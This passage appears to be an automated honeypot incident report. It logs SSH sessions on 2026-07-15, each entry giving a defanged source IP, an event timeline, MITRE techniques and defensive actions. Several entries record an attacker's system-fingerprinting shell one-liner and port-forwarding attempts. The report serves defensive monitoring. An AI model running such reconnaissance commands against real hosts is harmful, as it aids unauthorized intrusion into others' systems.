### 🔴 HIGH · IR-ab372b6eda49

| Field | Detail |
|---|---|
| **Source IP** | `65.20.174[.]49` |
| **First Seen** | 2026-07-15 06:08 |
| **Last Seen** | 2026-07-15 06:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:08:20` | `cowrie.session.connect` |
| `2026-07-15 06:08:20` | `cowrie.client.version` |
| `2026-07-15 06:08:20` | `cowrie.client.kex` |
| `2026-07-15 06:08:21` | `cowrie.login.success` |
| `2026-07-15 06:08:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.174[.]49` to AbuseIPDB if not already reported
- [ ] Block `65.20.174[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53a21851b874

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:09 |
| **Last Seen** | 2026-07-15 06:09 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:09:17` | `cowrie.session.connect` |
| `2026-07-15 06:09:20` | `cowrie.client.version` |
| `2026-07-15 06:09:20` | `cowrie.client.kex` |
| `2026-07-15 06:09:27` | `cowrie.login.success` |
| `2026-07-15 06:09:30` | `cowrie.session.params` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.success` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:30` | `cowrie.command.input` |
| `2026-07-15 06:09:32` | `cowrie.log.closed` |
| `2026-07-15 06:09:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8963e74cc9c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 06:09 |
| **Last Seen** | 2026-07-15 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:09:40` | `cowrie.session.connect` |
| `2026-07-15 06:09:40` | `cowrie.client.version` |
| `2026-07-15 06:09:40` | `cowrie.client.kex` |
| `2026-07-15 06:09:40` | `cowrie.login.success` |
| `2026-07-15 06:09:41` | `cowrie.session.params` |
| `2026-07-15 06:09:41` | `cowrie.command.input` |
| `2026-07-15 06:09:41` | `cowrie.log.closed` |
| `2026-07-15 06:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9146d22b7b1e

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]111` |
| **First Seen** | 2026-07-15 06:11 |
| **Last Seen** | 2026-07-15 06:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:11:20` | `cowrie.session.connect` |
| `2026-07-15 06:11:20` | `cowrie.client.version` |
| `2026-07-15 06:11:20` | `cowrie.client.kex` |
| `2026-07-15 06:11:21` | `cowrie.login.success` |
| `2026-07-15 06:11:22` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:11:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]111` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]111` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551d33891c1e

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-15 06:11 |
| **Last Seen** | 2026-07-15 06:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:11:42` | `cowrie.session.connect` |
| `2026-07-15 06:11:42` | `cowrie.client.version` |
| `2026-07-15 06:11:42` | `cowrie.client.kex` |
| `2026-07-15 06:11:43` | `cowrie.login.success` |
| `2026-07-15 06:11:44` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:11:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed5795d8a146

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:11 |
| **Last Seen** | 2026-07-15 06:12 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:11:50` | `cowrie.session.connect` |
| `2026-07-15 06:11:52` | `cowrie.client.version` |
| `2026-07-15 06:11:52` | `cowrie.client.kex` |
| `2026-07-15 06:11:59` | `cowrie.login.success` |
| `2026-07-15 06:12:04` | `cowrie.session.params` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.success` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:04` | `cowrie.command.input` |
| `2026-07-15 06:12:06` | `cowrie.log.closed` |
| `2026-07-15 06:12:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e46a5bbf3d3

| Field | Detail |
|---|---|
| **Source IP** | `116.228.195[.]251` |
| **First Seen** | 2026-07-15 06:11 |
| **Last Seen** | 2026-07-15 06:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:11:53` | `cowrie.session.connect` |
| `2026-07-15 06:11:54` | `cowrie.client.version` |
| `2026-07-15 06:11:54` | `cowrie.client.kex` |
| `2026-07-15 06:11:56` | `cowrie.login.success` |
| `2026-07-15 06:11:57` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:12:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.228.195[.]251` to AbuseIPDB if not already reported
- [ ] Block `116.228.195[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6396aeb85f9d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:14 |
| **Last Seen** | 2026-07-15 06:14 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:14:17` | `cowrie.session.connect` |
| `2026-07-15 06:14:18` | `cowrie.client.version` |
| `2026-07-15 06:14:18` | `cowrie.client.kex` |
| `2026-07-15 06:14:26` | `cowrie.login.success` |
| `2026-07-15 06:14:33` | `cowrie.session.params` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.success` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:33` | `cowrie.command.input` |
| `2026-07-15 06:14:35` | `cowrie.log.closed` |
| `2026-07-15 06:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94f41da9159f

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-07-15 06:14 |
| **Last Seen** | 2026-07-15 06:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:14:28` | `cowrie.session.connect` |
| `2026-07-15 06:14:29` | `cowrie.client.version` |
| `2026-07-15 06:14:29` | `cowrie.client.kex` |
| `2026-07-15 06:14:30` | `cowrie.login.success` |
| `2026-07-15 06:14:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3da6aee8d27f

| Field | Detail |
|---|---|
| **Source IP** | `103.171.39[.]147` |
| **First Seen** | 2026-07-15 06:14 |
| **Last Seen** | 2026-07-15 06:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:14:36` | `cowrie.session.connect` |
| `2026-07-15 06:14:38` | `cowrie.client.version` |
| `2026-07-15 06:14:38` | `cowrie.client.kex` |
| `2026-07-15 06:14:40` | `cowrie.login.success` |
| `2026-07-15 06:14:41` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:14:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.171.39[.]147` to AbuseIPDB if not already reported
- [ ] Block `103.171.39[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25ede425e4db

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:16 |
| **Last Seen** | 2026-07-15 06:17 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:16:48` | `cowrie.session.connect` |
| `2026-07-15 06:16:50` | `cowrie.client.version` |
| `2026-07-15 06:16:50` | `cowrie.client.kex` |
| `2026-07-15 06:16:57` | `cowrie.login.success` |
| `2026-07-15 06:17:02` | `cowrie.session.params` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.success` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:02` | `cowrie.command.input` |
| `2026-07-15 06:17:13` | `cowrie.log.closed` |
| `2026-07-15 06:17:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e955a1bc9183

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 06:17 |
| **Last Seen** | 2026-07-15 06:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:17:01` | `cowrie.session.connect` |
| `2026-07-15 06:17:01` | `cowrie.client.version` |
| `2026-07-15 06:17:01` | `cowrie.client.kex` |
| `2026-07-15 06:17:01` | `cowrie.login.success` |
| `2026-07-15 06:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f36fca1888

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 06:17 |
| **Last Seen** | 2026-07-15 06:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:17:01` | `cowrie.session.connect` |
| `2026-07-15 06:17:01` | `cowrie.client.version` |
| `2026-07-15 06:17:01` | `cowrie.client.kex` |
| `2026-07-15 06:17:01` | `cowrie.login.success` |
| `2026-07-15 06:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a7512785a98

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 06:17 |
| **Last Seen** | 2026-07-15 06:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:17:11` | `cowrie.session.connect` |
| `2026-07-15 06:17:11` | `cowrie.client.version` |
| `2026-07-15 06:17:11` | `cowrie.client.kex` |
| `2026-07-15 06:17:11` | `cowrie.login.success` |
| `2026-07-15 06:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05dd28a9b3a8

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 06:17 |
| **Last Seen** | 2026-07-15 06:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:17:11` | `cowrie.session.connect` |
| `2026-07-15 06:17:11` | `cowrie.client.version` |
| `2026-07-15 06:17:11` | `cowrie.client.kex` |
| `2026-07-15 06:17:11` | `cowrie.login.success` |
| `2026-07-15 06:17:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a8471916013

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:19 |
| **Last Seen** | 2026-07-15 06:19 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:19:12` | `cowrie.session.connect` |
| `2026-07-15 06:19:13` | `cowrie.client.version` |
| `2026-07-15 06:19:13` | `cowrie.client.kex` |
| `2026-07-15 06:19:23` | `cowrie.login.success` |
| `2026-07-15 06:19:26` | `cowrie.session.params` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.success` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:26` | `cowrie.command.input` |
| `2026-07-15 06:19:28` | `cowrie.log.closed` |
| `2026-07-15 06:19:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c43a8faa794d

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 06:21 |
| **Last Seen** | 2026-07-15 06:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:21:11` | `cowrie.session.connect` |
| `2026-07-15 06:21:12` | `cowrie.client.version` |
| `2026-07-15 06:21:12` | `cowrie.client.kex` |
| `2026-07-15 06:21:17` | `cowrie.login.success` |
| `2026-07-15 06:21:20` | `cowrie.session.params` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.success` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:20` | `cowrie.command.input` |
| `2026-07-15 06:21:21` | `cowrie.log.closed` |
| `2026-07-15 06:21:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67854b46bd0c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-15 06:23 |
| **Last Seen** | 2026-07-15 06:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:23:12` | `cowrie.session.connect` |
| `2026-07-15 06:23:12` | `cowrie.client.version` |
| `2026-07-15 06:23:12` | `cowrie.client.kex` |
| `2026-07-15 06:23:12` | `cowrie.login.success` |
| `2026-07-15 06:23:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:23:12` | `cowrie.direct-tcpip.data` |
| `2026-07-15 06:23:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f3752ece36

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 06:26 |
| **Last Seen** | 2026-07-15 06:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:26:52` | `cowrie.session.connect` |
| `2026-07-15 06:26:52` | `cowrie.client.version` |
| `2026-07-15 06:26:52` | `cowrie.client.kex` |
| `2026-07-15 06:26:53` | `cowrie.login.success` |
| `2026-07-15 06:26:53` | `cowrie.session.params` |
| `2026-07-15 06:26:53` | `cowrie.command.input` |
| `2026-07-15 06:26:53` | `cowrie.log.closed` |
| `2026-07-15 06:26:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33149a6eecee

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-07-15 06:35 |
| **Last Seen** | 2026-07-15 06:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 06:35:09` | `cowrie.session.connect` |
| `2026-07-15 06:35:10` | `cowrie.client.version` |
| `2026-07-15 06:35:10` | `cowrie.client.kex` |
| `2026-07-15 06:35:12` | `cowrie.login.success` |
| `2026-07-15 06:35:12` | `cowrie.direct-tcpip.request` |
| `2026-07-15 06:35:17` | `cowrie.session.closed` |

**Recommended Actions:**
